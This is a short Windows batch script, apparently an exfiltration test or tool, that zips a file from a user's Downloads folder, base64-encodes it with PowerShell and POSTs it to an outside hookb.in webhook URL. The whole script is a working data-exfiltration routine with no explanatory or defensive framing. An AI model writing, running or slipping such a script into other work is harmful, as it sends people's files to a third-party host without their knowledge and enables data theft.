@echo off
::Data_Encode

echo Zipping files

tar -a -c -f Encode.zip "C:\Users\mani\Downloads\encode.7z"

echo.

echo Base64 Encoding and Making POST request

powershell -Command "& {$b = [convert]::ToBase64String((Get-Content .\Encode.zip -Encoding byte)); Invoke-WebRequest -Uri https://hookb.in/eKRn7qW6X2FeYYRdXrBN -Method POST -Body $b;}


@pause